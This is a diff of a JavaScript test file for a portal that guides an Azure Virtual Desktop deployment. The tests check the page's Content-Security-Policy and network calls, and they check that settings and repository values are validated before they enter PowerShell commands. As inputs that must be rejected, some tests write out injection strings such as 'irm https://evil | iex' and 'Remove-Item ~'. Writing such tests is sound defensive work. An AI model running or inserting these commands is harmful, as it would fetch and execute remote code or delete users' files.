@@ -610,10 +610,19 @@ test('page: Verify access comes after Sign in, holds the probe, and the page fet
   assert.match(verify, /id="reach-run"/);
   assert.match(verify, /class="slot"/, 'the shared next-step box and paste box can sit in it');
   // Nothing pasted or measured leaves the browser: one fetch, no-cors, no credentials, no referrer, no body.
-  const fetches = [...html.matchAll(/\bfetch\(([^)]*)\)/g)];
+  const page = readFileSync(new URL('../../../site/portal/portal-page.js', import.meta.url), 'utf8');
+  const fetches = [...page.matchAll(/\bfetch\(([^)]*)\)/g)];
   assert.equal(fetches.length, 1);
   assert.match(fetches[0][1], /mode: 'no-cors'.*credentials: 'omit'.*referrerPolicy: 'no-referrer'/);
-  assert.doesNotMatch(html, /XMLHttpRequest|sendBeacon|new WebSocket|new EventSource/);
+  assert.doesNotMatch(page, /XMLHttpRequest|sendBeacon|new WebSocket|new EventSource/);
+  // The page itself runs no inline script and declares a CSP that allows none, nor any third-party source (red team PH-9).
+  assert.doesNotMatch(html, /<script(?![^>]*\bsrc=")/, 'inline script in index.html');
+  assert.doesNotMatch(html, /\son[a-z]+="/i, 'inline event handler in index.html');
+  const csp = /<meta http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(html);
+  assert.ok(csp, 'CSP meta tag');
+  for (const d of ["default-src 'none'", "script-src 'self'", "connect-src https:", "base-uri 'none'", "form-action 'none'"]) assert.ok(csp[1].split('; ').includes(d), d);
+  assert.doesNotMatch(csp[1], /unsafe-eval|script-src[^;]*unsafe-inline|https?:\/\//);
+  for (const m of html.matchAll(/<(?:script|link)[^>]*(?:src|href)="([^"]+)"/g)) assert.doesNotMatch(m[1], /^(https?:)?\/\//, 'third-party ' + m[1]);
   for (const f of ['portal-core.js', 'report.js']) {
     assert.doesNotMatch(readFileSync(new URL(`../../../site/portal/${f}`, import.meta.url), 'utf8'), /\bfetch\(|XMLHttpRequest|sendBeacon|WebSocket|EventSource/, f);
   }
@@ -664,7 +673,7 @@ test('state: post-deployment ready with launch IDs -> kept in the config the pag
 test('page: the launch link opens in a new tab without a referrer and defaults to the web client', () => {
   const html = readFileSync(new URL('../../../site/portal/index.html', import.meta.url), 'utf8');
   assert.match(html, /<a id="launch-link"[^>]*href="https:\/\/windows\.cloud\.microsoft"[^>]*target="_blank" rel="noopener noreferrer"/);
-  assert.match(html, /P\.launchUrl\(/);
+  assert.match(readFileSync(new URL('../../../site/portal/portal-page.js', import.meta.url), 'utf8'), /P\.launchUrl\(/);
 });
 
 // ---------------------------------------------------------------- verify access: telemetry (decision 0014)
@@ -898,8 +907,10 @@ test('state: rotation done -> delete the old devices by hand; roll back means ro
 });
 
 test('published copy: portal-config.js values are validated before they reach a command (decision 0017)', () => {
-  assert.deepEqual(P.siteConfig({ repoUrl: 'https://github.com/contoso/avd-landing-zone/', ref: 'v1.2.0' }), { repoUrl: 'https://github.com/contoso/avd-landing-zone', ref: 'v1.2.0', ignored: [] });
-  assert.deepEqual(P.siteConfig(undefined), { repoUrl: null, ref: null, ignored: [] });
+  assert.deepEqual(P.siteConfig({ repoUrl: 'https://github.com/contoso/avd-landing-zone/', ref: 'v1.2.0' }), { repoUrl: 'https://github.com/contoso/avd-landing-zone', ref: 'v1.2.0', commit: null, ignored: [] });
+  assert.deepEqual(P.siteConfig(undefined), { repoUrl: null, ref: null, commit: null, ignored: [] });
+  assert.equal(P.siteConfig({ commit: 'ABCDEF0123456789abcdef0123456789abcdef01' }).commit, 'abcdef0123456789abcdef0123456789abcdef01');
+  for (const bad of ['abc', 'abcdefg;rm', 'master', 12345678]) assert.deepEqual(P.siteConfig({ commit: bad }).ignored, ['commit'], String(bad));
   for (const bad of ['https://github.com/x/y; irm https://evil | iex', 'https://evil.example/x/y', 'https://github.com/x/../y', 'https://github.com/x/y/z', 'git@github.com:x/y', 42])
     assert.deepEqual(P.siteConfig({ repoUrl: bad }).ignored, ['repoUrl'], String(bad));
   for (const bad of ['--upload-pack=x', "v1'; iex x", 'a..b', 'v1 ', '-b', 'x.lock', 'a//b', ''])
@@ -915,4 +926,41 @@ test('published copy: commands point an existing clone at the pinned repo and ch
   assert.match(master, /git checkout -q master; git pull -q --ff-only/);
   // An invalid ref (from anywhere) never reaches the command.
   assert.match(P.actionsForStep('predeploy', Object.assign({}, base, { repoUrl: P.DEFAULTS.repoUrl, ref: "x'; iex y" }))[0].command, /git checkout -q master/);
+});
+
+// ---------------------------------------------------------------- settings validation (red team PH-4) and the version check (PH-8)
+test('settings: every value that enters a command is checked; a pasted context cannot carry more than a value', () => {
+  const ok = P.validSettings({ parameterFile: 'parameters/test.bicepparam', location: ' eastus2 ', usersGroup: 'AVD Users (pilot)', adminsGroup: "O'Brien's admins", namePrefix: 'avdlz', environment: 'prod', testUserUpn: 'first.last@contoso.com', graphClientId: '11111111-2222-3333-4444-555555555555', sizing: { hosts: 2 } });
+  assert.deepEqual(ok.rejected, []);
+  assert.equal(ok.settings.location, 'eastus2');
+  assert.deepEqual(ok.settings.sizing, { hosts: 2 }, 'other keys pass through');
+  const bad = P.validSettings({ parameterFile: '../x.bicepparam; iex', location: 'eastus2; Remove-Item ~', usersGroup: 'a\nb', namePrefix: 'avdlz-prod', environment: 'staging', testUserUpn: "x'; iex@evil", graphClientId: 'not-a-guid' });
+  assert.deepEqual(bad.rejected.sort(), ['environment', 'graphClientId', 'location', 'namePrefix', 'parameterFile', 'testUserUpn', 'usersGroup']);
+  assert.deepEqual(bad.settings, {});
+  assert.deepEqual(P.validSettings({ location: '', namePrefix: null }), { settings: {}, rejected: [] }, 'empty is neither');
+  assert.deepEqual(Object.keys(P.SETTINGS).sort(), [...P.SETTING_NAMES].sort());
+  for (const k of P.SETTING_NAMES) assert.ok(P.SETTINGS[k].test(String(P.DEFAULTS[k])) || P.DEFAULTS[k] === '', k + ' default fits');
+  // A crafted state line: the bad values are dropped and named, the good ones and the rest of the context are kept.
+  const text = '<<<AVDLZ-STATE ' + JSON.stringify({ v: 1, stage: 'predeploy', status: 'ready', context: { parameterFile: 'parameters/dev.bicepparam', location: 'eastus2', namePrefix: 'x; irm https://evil | iex', environment: 'dev', sizing: { hosts: 1, vmSize: 'Standard_E4as_v5', maxSessions: 16, profileQuotaGiB: 100 } }, counts: { pass: 1 }, failures: [], warnings: [] }) + ' AVDLZ-STATE>>>';
+  const r = P.analyze(text, { namePrefix: 'avdlz' });
+  assert.deepEqual(r.rejectedSettings, ['namePrefix']);
+  assert.equal(r.config.namePrefix, 'avdlz');
+  assert.equal(r.config.location, 'eastus2');
+  assert.equal(r.sizing.hosts, 1);
+  for (const a of r.actions) assert.doesNotMatch(a.command, /irm|iex/);
+});
+
+test('version: the state line carries the scripts\' commit and the portal says when it differs from its own', () => {
+  const state = (commit) => '<<<AVDLZ-STATE ' + JSON.stringify({ v: 1, stage: 'predeploy', status: 'ready', context: { location: 'eastus2', commit }, counts: {}, failures: [], warnings: [] }) + ' AVDLZ-STATE>>>';
+  const same = P.analyze(state('abc1234'), {}, { portalCommit: 'abc1234def0123456789abcdef0123456789abcd' });
+  assert.equal(same.versionNote, '');
+  assert.deepEqual(same.commit, { state: 'abc1234', portal: 'abc1234def0123456789abcdef0123456789abcd' });
+  assert.equal(same.config.commit, undefined, 'the commit is not a setting');
+  const diff = P.analyze(state('abc1234'), {}, { portalCommit: '0123456' });
+  assert.match(diff.versionNote, /commit abc1234.*built from 0123456/);
+  assert.equal(diff.status, 'ready', 'a version note never changes the verdict');
+  assert.equal(P.analyze(state('abc1234'), {}, {}).versionNote, '', 'an unversioned portal (a copy without a commit) says nothing');
+  assert.equal(P.analyze(state(undefined), {}, { portalCommit: '0123456' }).versionNote, '', 'old scripts without a commit say nothing');
+  assert.equal(P.analyze(state('x; iex'), {}, { portalCommit: '0123456' }).commit.state, null, 'a commit that is not a hash is ignored');
+  assert.equal(P.versionNote('abc1234', 'ABC1234'), '');
 });
